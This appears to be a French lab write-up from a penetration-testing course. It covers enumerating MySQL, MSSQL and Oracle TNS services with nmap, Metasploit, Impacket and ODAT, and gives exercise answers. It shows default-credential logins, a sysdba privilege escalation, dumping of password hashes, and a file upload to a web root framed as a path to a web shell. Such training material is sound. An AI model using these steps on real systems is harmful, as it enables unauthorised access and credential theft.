```bash
MySQL [customers]> describe myTable;
+-----------+--------------------+------+-----+---------+----------------+
| Field     | Type               | Null | Key | Default | Extra          |
+-----------+--------------------+------+-----+---------+----------------+
| id        | mediumint unsigned | NO   | PRI | NULL    | auto_increment |
| name      | varchar(255)       | YES  |     | NULL    |                |
| email     | varchar(255)       | YES  |     | NULL    |                |
| country   | varchar(100)       | YES  |     | NULL    |                |
| postalZip | varchar(20)        | YES  |     | NULL    |                |
| city      | varchar(255)       | YES  |     | NULL    |                |
| address   | varchar(255)       | YES  |     | NULL    |                |
| pan       | varchar(255)       | YES  |     | NULL    |                |
| cvv       | varchar(255)       | YES  |     | NULL    |                |
+-----------+--------------------+------+-----+---------+----------------+
9 rows in set (0.046 sec)
```

Nous voyons une column `name` nous allons donc nous en servir

```bash
MySQL [customers]> select email from myTable where name = "Otto Lang";
+---------------------+
| email               |
+---------------------+
| ultrices@google.htb |
+---------------------+
1 row in set (0.044 sec)
```

**Réponse :** `ultrices@google.htb`

---

## MSSQL

### Qu'est-ce que MSSQL ?

**Microsoft SQL (MSSQL)** est le système de gestion de base de données relationnelle SQL développé par Microsoft. Contrairement à MySQL que nous avons vu précédemment, MSSQL est **closed source** (propriétaire) et a été initialement conçu pour fonctionner sur Windows.

> **Pour les débutants** : MSSQL est la solution de base de données de Microsoft, très utilisée dans les environnements Windows et pour les applications .NET. C'est l'équivalent Microsoft de MySQL.
{: .prompt-info}

**Caractéristiques principales :**
- Populaire chez les administrateurs et développeurs travaillant avec **.NET Framework**
- Support natif fort pour .NET
- Principalement déployé sur Windows (bien que des versions Linux/MacOS existent)
- En pentest, on rencontre principalement des instances MSSQL sur des cibles Windows

### Clients MSSQL

**SQL Server Management Studio (SSMS)** est l'outil de gestion principal pour MSSQL. Il peut être installé avec le package MSSQL ou téléchargé séparément.

![img](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/112/ssms.png)

**Points importants sur SSMS :**
- Généralement installé sur le serveur pour la configuration initiale
- C'est une **application client**, elle peut être installée sur n'importe quel système
- Un administrateur peut gérer la base depuis son poste de travail

> **En pentest** : On peut trouver SSMS installé sur des postes compromis avec des **credentials sauvegardées**, permettant de se connecter à la base de données sans connaître le mot de passe.
{: .prompt-tip}

**Autres clients MSSQL disponibles :**

| Client | Usage |
|--------|-------|
| `mssql-cli` | Interface en ligne de commande |
| `SQL Server PowerShell` | Gestion via PowerShell |
| `HeidiSQL` | Client GUI multi-plateformes |
| `SQLPro` | Client commercial |
| `Impacket's mssqlclient.py` | **Le plus utile en pentest** |

### Impacket mssqlclient.py

Pour les pentesters, **mssqlclient.py** d'Impacket est l'outil le plus pratique car il est préinstallé sur la plupart des distributions de pentest.

**Localiser l'outil :**
```bash
locate mssqlclient
```

**Résultat :**
```
/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

### Bases de données système MSSQL

MSSQL possède des **bases de données système par défaut** qui nous aident à comprendre la structure de toutes les bases hébergées sur le serveur cible :

| Base système | Description |
|--------------|-------------|
| `master` | Suit toutes les informations système pour l'instance SQL Server |
| `model` | Base de données template qui sert de structure pour chaque nouvelle base créée |
| `msdb` | Utilisée par SQL Server Agent pour planifier les jobs et alertes |
| `tempdb` | Stocke les objets temporaires |
| `resource` | Base en lecture seule contenant les objets système inclus avec SQL Server |

> La base `model` est particulièrement intéressante : **tout changement** dans cette base sera reflété dans toutes les nouvelles bases créées après la modification.
{: .prompt-info}

Pour plus de détails, consulter la [documentation Microsoft sur les bases système](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases).

### Configuration par défaut

Lors de l'installation initiale de MSSQL pour un accès réseau, le service SQL s'exécute généralement sous le compte **NT SERVICE\MSSQLSERVER**.

![img](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/112/auth.png)

**Authentification Windows par défaut :**

La connexion côté client est possible via **Windows Authentication**. Par défaut, le chiffrement n'est **pas forcé** lors de la tentative de connexion.

**Mon observation :** L'authentification Windows signifie que l'OS Windows sous-jacent traite la demande de connexion en utilisant soit :
- La base SAM locale
- Le contrôleur de domaine (Active Directory)

**Avantages et risques :**

**Avantages :**
- Audit des activités centralisé
- Contrôle d'accès unifié dans l'environnement Windows

**Risques :**
- Si un compte est compromis, cela peut mener à une **escalade de privilèges**
- Mouvement latéral possible à travers tout le domaine Windows

> Active Directory peut être idéal pour l'audit et le contrôle d'accès, mais un compte compromis peut devenir un vecteur d'attaque majeur dans un environnement de domaine Windows.
{: .prompt-danger}

### Configurations dangereuses

En adoptant la perspective d'un administrateur IT, j'ai identifié plusieurs configurations à risque. Dans des journées chargées avec plusieurs projets simultanés, les erreurs de configuration sont faciles à commettre.

**Paramètres dangereux à surveiller :**

| Configuration | Risque |
|---------------|--------|
| Clients MSSQL sans chiffrement | Connexions en clair interceptables |
| Certificats auto-signés | Possibilité de spoofing des certificats |
| Named pipes activés | Vecteur d'attaque supplémentaire |
| Credentials `sa` faibles ou par défaut | Compte admin souvent oublié par les admins |

> Le compte **sa** (System Administrator) est particulièrement critique. Les administrateurs oublient souvent de le désactiver ou de changer son mot de passe par défaut.
{: .prompt-warning}

**Ce qui m'inquiète :** Cette liste n'est pas exhaustive. Il existe d'innombrables façons de mal configurer MSSQL selon les besoins des organisations. Une seule petite erreur peut compromettre un serveur critique.

### Énumération avec Nmap

MSSQL écoute par défaut sur le **port TCP 1433**. Nmap dispose de scripts dédiés pour énumérer ce service :
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

**Résultat :**
```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763

Host script results:
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false
```

**Mon analyse :**

Ce scan nous révèle des informations précieuses :
- **Hostname** : SQL-01
- **Instance** : MSSQLSERVER
- **Version** : Microsoft SQL Server 2019 RTM (15.00.2000.00)
- **Named pipes activés** : `\\10.129.201.248\pipe\sql\query`
- **Port TCP** : 1433
- Pas de clustering

> Les **named pipes** activés représentent un vecteur d'attaque supplémentaire. Il est important de noter cette découverte.
{: .prompt-tip}

### Énumération avec Metasploit

Metasploit propose un scanner auxiliaire `mssql_ping` pour énumérer le service MSSQL :
```bash
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

**Résultat :**
```
[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] Auxiliary module execution completed
```

**Ce que j'ai appris :** Le scanner Metasploit fournit des informations similaires à Nmap mais dans un format plus structuré, idéal pour automatiser la reconnaissance.

### Connexion avec mssqlclient.py

Si nous obtenons ou devinons des identifiants, nous pouvons nous connecter à distance au serveur MSSQL et interagir avec les bases via **T-SQL (Transact-SQL)**.

**Connexion avec authentification Windows :**
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

**Résultat :**
```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL>
```

**Mon observation :** La connexion bascule automatiquement en TLS pour le chiffrement, et nous sommes placés dans la base `master` par défaut.

### Lister les bases de données

Une fois connecté, la première étape est de lister les bases présentes :
```sql
SQL> select name from sys.databases
```

**Résultat :**
```
name                                                                            
--------------------------------------------------------------------------------
master                                                                          
tempdb                                                                          
model                                                                           
msdb                                                                            
Transactions
```

**Ma démarche :**

1. On retrouve les 4 bases système : `master`, `tempdb`, `model`, `msdb`
2. Une base personnalisée : `Transactions` (probablement la cible intéressante)

> Une fois authentifié sur MSSQL, nous pouvons interagir directement avec le **SQL Database Engine**, ce qui nous donne un accès complet aux données, structures et potentiellement à l'exécution de commandes système.
{: .prompt-danger}

### Points importants à retenir

Lors de l'énumération MSSQL, je me concentre sur :

1. **Identifier la version** exacte pour rechercher des vulnérabilités connues
2. **Vérifier les named pipes** comme vecteur d'attaque
3. **Tester le compte `sa`** avec des mots de passe par défaut ou faibles
4. **Énumérer les bases personnalisées** qui contiennent les données métier
5. **Vérifier l'authentification** (Windows Auth vs SQL Auth)
6. **Chercher SSMS** sur les postes compromis avec des credentials sauvegardées

> MSSQL, particulièrement dans les environnements Active Directory, peut être un pivot majeur pour le mouvement latéral et l'escalade de privilèges dans un domaine Windows.
{: .prompt-warning}

Pour approfondir MSSQL, consulter :
- [Microsoft SQL Server Documentation](https://docs.microsoft.com/en-us/sql/sql-server/)
- [T-SQL Reference](https://docs.microsoft.com/en-us/sql/t-sql/language-reference)
- [Impacket mssqlclient.py](https://github.com/SecureAuthCorp/impacket)

---

**Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.**

Ok nous allons faire ceci grâce a metasploit pour nous faciliter la vie

```bash
use auxiliary/scanner/mssql/mssql_ping
```

Nous devons mettre le **RHOSTS** et c'est tout

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/mssql/mssql_ping) >> set rhosts 10.129.106.154
rhosts => 10.129.106.154
[msf](Jobs:0 Agents:0) auxiliary(scanner/mssql/mssql_ping) >> run
[*] 10.129.106.154        - SQL Server information for 10.129.106.154:
[+] 10.129.106.154        -    ServerName      = ILF-SQL-01
[+] 10.129.106.154        -    InstanceName    = MSSQLSERVER
[+] 10.129.106.154        -    IsClustered     = No
[+] 10.129.106.154        -    Version         = 15.0.2000.5
[+] 10.129.106.154        -    tcp             = 1433
[+] 10.129.106.154        -    np              = \\ILF-SQL-01\pipe\sql\query
[*] 10.129.106.154        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Réponse :** `ILF-SQL-01`

**Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**

Maintenant nous allons nous connecter au réseau avec les identifiants fournis

```bash
└──╼ [★]$ python3 /usr/local/bin/mssqlclient.py backdoor@10.129.106.154 -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ILF-SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(ILF-SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (ILF-SQL-01\backdoor  dbo@master)> 
```

Nous sommes connecté reste a énumérer les différentes bases de données

```bash
SQL (ILF-SQL-01\backdoor  dbo@master)> select name from sys.databases
name        
---------   
master      

tempdb      

model       

msdb        

Employees
```

Il n'y a qu'une seule base de donnée qui est non commune a mssql

**Réponse :** `Employees`

---

## Oracle TNS

### Qu'est-ce qu'Oracle TNS ?

**Oracle Transparent Network Substrate (TNS)** est un protocole de communication qui facilite la communication entre les bases de données Oracle et les applications sur les réseaux. Initialement introduit dans la suite logicielle Oracle Net Services, TNS supporte divers protocoles réseau entre les bases Oracle et les applications clientes.

> **Pour les débutants** : TNS est le "langage" que les bases de données Oracle utilisent pour communiquer avec les applications. C'est comme un traducteur qui permet à différents systèmes de se comprendre.
{: .prompt-info}

**Protocoles supportés :**
- IPX/SPX
- TCP/IP
- IPv6
- SSL/TLS

**Domaines d'utilisation privilégiés :**

TNS est devenu une solution privilégiée pour gérer des bases de données volumeuses et complexes dans plusieurs secteurs :

| Secteur | Usage |
|---------|-------|
| Santé | Gestion de dossiers médicaux |
| Finance | Transactions bancaires sécurisées |
| Commerce de détail | Gestion d'inventaires massifs |

### Fonctionnalités principales

Au fil du temps, TNS a été mis à jour pour supporter des technologies modernes et offre maintenant :

| Fonctionnalité | Description |
|----------------|-------------|
| **Name resolution** | Résolution des noms de services |
| **Connection management** | Gestion des connexions client-serveur |
| **Load balancing** | Répartition de charge entre instances |
| **Security** | Chiffrement SSL/TLS natif |

**Mon observation :** TNS ajoute une **couche de chiffrement supplémentaire** au-dessus de TCP/IP, ce qui sécurise l'architecture de la base contre les accès non autorisés ou les attaques visant à compromettre les données en transit.

> TNS fournit des outils avancés pour les administrateurs : monitoring de performance, analyse, reporting d'erreurs, logging, gestion de charge de travail et tolérance aux pannes via les services de base de données.
{: .prompt-tip}

### Configuration par défaut

La configuration par défaut varie selon la version et l'édition d'Oracle installée. Voici les paramètres standards :

**Paramètres réseau par défaut :**
- **Port d'écoute** : TCP/1521 (modifiable pendant l'installation)
- **Protocoles supportés** : TCP/IP, UDP, IPX/SPX, AppleTalk
- **Interfaces réseau** : Multiple interfaces, écoute sur IP spécifiques ou toutes les interfaces disponibles

**Gestion à distance :**
- Oracle 8i/9i : Gestion à distance **activée** par défaut
- Oracle 10g/11g : Gestion à distance **désactivée** par défaut

**Sécurité par défaut :**
- Accepte uniquement les connexions depuis des hôtes autorisés
- Authentification basique par hostname, IP, username et password
- Chiffrement via Oracle Net Services entre client et serveur

### Fichiers de configuration

TNS utilise deux fichiers de configuration principaux situés dans `$ORACLE_HOME/network/admin` :

#### tnsnames.ora (côté client)

Fichier texte en clair contenant les informations de configuration pour les instances Oracle et autres services réseau utilisant TNS.

**Exemple de fichier tnsnames.ora :**
```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**Mon analyse de cette configuration :**
- **Service** : ORCL
- **Protocole** : TCP
- **Hôte** : 10.129.11.102
- **Port** : 1521
- **Service Name** : orcl (utilisé par les clients pour se connecter)
- **Type de serveur** : DEDICATED (serveur dédié)

> Le fichier `tnsnames.ora` peut contenir plusieurs entrées pour différentes bases et services, avec des informations supplémentaires comme les détails d'authentification, les paramètres de pooling de connexions et les configurations de load balancing.
{: .prompt-info}

#### listener.ora (côté serveur)

Fichier de configuration serveur qui définit les propriétés et paramètres du processus listener, responsable de recevoir les requêtes clientes entrantes et de les transférer à l'instance Oracle appropriée.

**Exemple de fichier listener.ora :**
```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

**En résumé :**
- Le client utilise `tnsnames.ora` pour résoudre les noms de services en adresses réseau
- Le listener utilise `listener.ora` pour déterminer les services à écouter et son comportement

### PL/SQL Exclusion List

Les bases Oracle peuvent être protégées via une **PL/SQL Exclusion List (PlsqlExclusionList)**.

**Comment ça fonctionne :**
1. Créer un fichier texte dans `$ORACLE_HOME/sqldeveloper`
2. Y lister les noms des packages ou types PL/SQL à exclure de l'exécution
3. Charger ce fichier dans l'instance de base de données

> Cette liste sert de **blacklist** : les éléments listés ne peuvent pas être accédés via Oracle Application Server.
{: .prompt-warning}

### Paramètres de configuration TNS

Voici les paramètres principaux que l'on peut configurer dans les fichiers TNS :

| Paramètre | Description |
|-----------|-------------|
| `DESCRIPTION` | Descripteur fournissant un nom pour la base et son type de connexion |
| `ADDRESS` | Adresse réseau de la base (hostname + port) |
| `PROTOCOL` | Protocole réseau utilisé pour la communication |
| `PORT` | Numéro de port pour la communication |
| `CONNECT_DATA` | Attributs de connexion (service name, SID, protocole) |
| `INSTANCE_NAME` | Nom de l'instance à laquelle se connecter |
| `SERVICE_NAME` | Nom du service cible |
| `SERVER` | Type de serveur (dedicated ou shared) |
| `USER` | Nom d'utilisateur pour l'authentification |
| `PASSWORD` | Mot de passe pour l'authentification |
| `SECURITY` | Type de sécurité de la connexion |
| `VALIDATE_CERT` | Validation du certificat SSL/TLS |
| `SSL_VERSION` | Version SSL/TLS à utiliser |
| `CONNECT_TIMEOUT` | Limite de temps (secondes) pour établir une connexion |
| `RECEIVE_TIMEOUT` | Limite de temps pour recevoir une réponse |
| `SEND_TIMEOUT` | Limite de temps pour envoyer une requête |
| `SQLNET.EXPIRE_TIME` | Limite de temps pour détecter une connexion échouée |
| `TRACE_LEVEL` | Niveau de traçage de la connexion |
| `TRACE_DIRECTORY` | Répertoire de stockage des fichiers de trace |
| `LOG_FILE` | Fichier de stockage des logs |

### Installation des outils d'énumération

Avant d'énumérer le listener TNS, j'ai dû installer plusieurs packages et outils :
```bash
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

**Vérifier l'installation d'ODAT :**
```bash
./odat.py -h
```

**Résultat :**
```
            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
```

> **ODAT (Oracle Database Attacking Tool)** est un outil de pentest open-source écrit en Python, conçu pour énumérer et exploiter les vulnérabilités dans les bases Oracle. Il permet d'identifier les injections SQL, l'exécution de code à distance et l'escalade de privilèges.
{: .prompt-tip}

### Énumération avec Nmap

J'ai scanné le port par défaut d'Oracle TNS :
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

**Résultat :**
```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

**Mon observation :** Le port est ouvert et le service tourne. La version détectée est Oracle TNS listener 11.2.0.2.0.

### Comprendre les SID Oracle

Un **System Identifier (SID)** est un nom unique qui identifie une instance de base de données particulière dans Oracle RDBMS.

**Points clés sur les SID :**
- Une base Oracle peut avoir plusieurs instances, chacune avec son propre SID
- Une instance = ensemble de processus + structures mémoire qui gèrent les données
- Le client spécifie le SID dans sa chaîne de connexion
- Si aucun SID n'est spécifié, la valeur par défaut du fichier `tnsnames.ora` est utilisée

> **Important en pentest** : Si le client spécifie un SID incorrect, la tentative de connexion échouera. Les SID sont essentiels pour identifier l'instance cible.
{: .prompt-warning}

### Bruteforce de SID avec Nmap

J'ai utilisé le script NSE `oracle-sid-brute` pour deviner les SID :
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

**Résultat :**
```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

**Mon analyse :** Le SID découvert est **XE** (Oracle Express Edition).

### Énumération avec ODAT

ODAT peut effectuer une variété de scans pour énumérer et collecter des informations sur les services Oracle. J'ai utilisé l'option `all` pour tester tous les modules :
```bash
./odat.py all -s 10.129.204.235
```

**Résultat (extrait) :**
```
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

[!] Notice: 'mdsys' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...
```

**Ce qui m'a surpris :** ODAT a trouvé des **credentials valides** : `scott:tiger`. Ce sont des identifiants par défaut souvent oubliés par les administrateurs.

> Les credentials `scott:tiger` sont des identifiants de démonstration classiques d'Oracle, souvent laissés activés en production par négligence.
{: .prompt-danger}

### Connexion avec SQLplus

Avec les identifiants trouvés, j'ai pu me connecter à la base Oracle :
```bash
sqlplus scott/tiger@10.129.204.235/XE
```

**Résultat :**
```
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

**Mon observation :** La connexion a réussi mais un avertissement indique que le mot de passe expire dans 7 jours.

> **Erreur courante** : Si vous obtenez `error while loading shared libraries: libsqlplus.so`, exécutez :
> ```bash
> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
> sudo ldconfig
> ```
{: .prompt-tip}

### Énumération de la base de données

**Lister toutes les tables disponibles :**
```sql
SQL> select table_name from all_tables;
```

**Résultat (extrait) :**
```
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
...SNIP...
```

**Vérifier les privilèges de l'utilisateur actuel :**
```sql
SQL> select * from user_role_privs;
```

**Résultat :**
```
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

**Mon analyse :** L'utilisateur `scott` n'a pas de privilèges administratifs. Cependant, je peux tenter de me connecter en tant que **sysdba** (System Database Admin) pour obtenir des privilèges élevés.

### Escalade de privilèges vers sysdba

J'ai tenté de me connecter avec les mêmes credentials mais en spécifiant le rôle `sysdba` :
```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**Résultat :**
```
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;
```

**Privilèges obtenus :**
```
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
...SNIP...
```

**Ce qui m'a surpris :** L'escalade a fonctionné ! Je suis maintenant connecté en tant que **SYS** avec le rôle **DBA** et de nombreux privilèges administratifs.

> Cette escalade est possible lorsque l'utilisateur `scott` dispose des privilèges appropriés, généralement accordés par l'administrateur ou si l'utilisateur est l'administrateur lui-même.
{: .prompt-warning}

### Extraction des hashes de mots de passe

Avec les privilèges sysdba, j'ai pu extraire les hashes des mots de passe :
```sql
SQL> select name, password from sys.user$;
```

**Résultat :**
```
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
OUTLN                          4A3BA55E08595C81
...SNIP...
```

**Mon observation :** Ces hashes peuvent être extraits et crackés offline avec des outils comme Hashcat ou John the Ripper.

> Bien que nous ayons accès, nous ne pouvons généralement pas ajouter de nouveaux utilisateurs ou faire des modifications majeures sans alerter les administrateurs.
{: .prompt-info}

### Upload de fichiers avec ODAT

Une autre technique d'exploitation consiste à uploader un web shell. Cela nécessite que le serveur exécute un serveur web et que nous connaissions l'emplacement exact du répertoire racine.

**Chemins par défaut des serveurs web :**

| OS | Chemin |
|----|--------|
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

**Créer un fichier de test :**
```bash
echo "Oracle File Upload Test" > testing.txt
```

**Upload avec ODAT :**
```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Résultat :**
```
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

**Vérifier l'upload :**
```bash
curl -X GET http://10.129.204.235/testing.txt
```

**Résultat :**
```
Oracle File Upload Test
```

**Mon analyse :** L'upload a réussi ! Le fichier est accessible via HTTP. Cette technique peut être utilisée pour uploader un web shell et obtenir une exécution de code à distance.

> **Important** : Toujours tester d'abord avec des fichiers inoffensifs pour éviter de déclencher les antivirus ou systèmes IDS/IPS.
{: .prompt-tip}

### Points importants à retenir

Lors de l'énumération d'Oracle TNS, je me concentre sur :

1. **Scanner le port 1521** pour identifier le service TNS
2. **Bruteforce les SID** avec Nmap ou ODAT
3. **Tester les credentials par défaut** (`scott:tiger`, `sys:change_on_install`)
4. **Tenter l'escalade vers sysdba** si possible
5. **Extraire les hashes** pour cracking offline
6. **Identifier les versions Oracle** pour chercher des vulnérabilités connues
7. **Tester l'upload de fichiers** si un serveur web est présent

> Oracle TNS expose souvent des configurations par défaut dangereuses. Les credentials `scott:tiger` sont emblématiques mais d'autres comptes par défaut existent selon la version Oracle.
{: .prompt-danger}

Pour approfondir Oracle et sa sécurisation, consulter :
- [Oracle Database Security Guide](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/)
- [ODAT Documentation](https://github.com/quentinhardy/odat)
- [Oracle TNS Protocol](https://docs.oracle.com/en/database/oracle/oracle-database/19/netag/understanding-oracle-net-architecture.html)

---

**Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.**

Bon pour trouver le hash de l'utilisateur `DBSNMP` nous devons d'abors énumérer tout ça pour mieux y voir avec les outils montré précédemment

```bash
└──╼ [★]$ sudo nmap -p1521 -sV 10.129.223.63 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 11:08 CST
Nmap scan report for 10.129.223.63
Host is up (0.042s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

On y voit bien le port pour oracle avec sa version maintenant il faut qu'on brute force le SID avec **nmap** encore

```bash
└──╼ [★]$ sudo nmap -p1521 -sV 10.129.223.63 --open --script oracle-sid-brute
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-26 11:10 CST
Nmap scan report for 10.129.223.63
Host is up (0.042s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.11 seconds
```

Bien comme dans le cours le SID c'est `XE` nous allons pouvoir faire un test pour voir si il y a des identifiants qui ne sont pas corrigé comme les suivant pour trouver un point d'entrer sur le système en premier et après monter en privilège

```bash
└──╼ [★]$ /opt/oracle/instantclient_21_4/sqlplus scott/tiger@10.129.223.63/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Wed Nov 26 11:45:12 2025
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

